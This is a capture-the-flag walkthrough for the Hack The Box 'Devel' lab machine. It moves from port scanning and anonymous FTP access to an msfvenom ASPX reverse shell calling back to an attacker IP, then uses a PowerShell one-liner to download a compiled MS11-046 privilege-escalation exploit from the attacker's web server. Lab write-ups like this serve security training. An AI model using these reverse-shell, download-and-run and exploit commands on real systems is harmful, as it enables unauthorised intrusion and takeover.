# [Devel](https://app.hackthebox.com/machines/devel)

```bash
nmap -p- --min-rate 10000 10.10.10.5 -Pn 
```
![Alt text](img/image.png)

From open ports(21,80), we do greater nmap scan for these.

```bash
nmap -A -sC -sV -p21,80 10.10.10.5 -Pn 
```

I see that it is IIS server which runs via Dotnet language, for this .aspx language is used.

![Alt text](img/image-1.png)


Another thing, I see that I can login to FTP by anonymously (anonymous: empty_password).

![Alt text](img/image-2.png)


I see that FTP's shell is server on http port (80), that's why we can upload malicious **'dr4ks.aspx**' file into FTP.

So, let's create malicious reverse shell via `msfvenom` tool.

```bash
msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.16.8 LPORT=1337 -o dr4ks.aspx
```

![Alt text](img/image-3.png)

Then, I browse the page which my reverse shell.aspx works.

![Alt text](img/image-4.png)


I got reverse shell.

![Alt text](img/image-5.png)


While I do `systeminfo` command to learn target's infrastructure.

![Alt text](img/image-6.png)


I see that it Microsoft Windows 7 build 7600 system.

Let's search publicly known exploits.

That's CVE-2011-1249 which calls as 'MS11-046'.


Let's download C script.

```bash
searchsploit -m 40564
i686-w64-mingw32-gcc 40564.c -o 40564.exe -lws2_32
```

![Alt text](img/image-7.png)


Now, as I have executable, let's try to upload this into target machine.

```bash
python3 -m http.server --bind 10.10.16.8 8080  # create web app to serve files

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.16.8:8080/40564.exe', 'c:\Users\Public\Downloads\40564.exe')"  #download
```

![Alt text](img/image-8.png)

![Alt text](img/image-9.png)


After execution of this malicious exe, we are **ROOT USER.**

![Alt text](img/image-10.png)


user.txt

![Alt text](img/image-11.png)


root.txt

![Alt text](img/image-12.png)

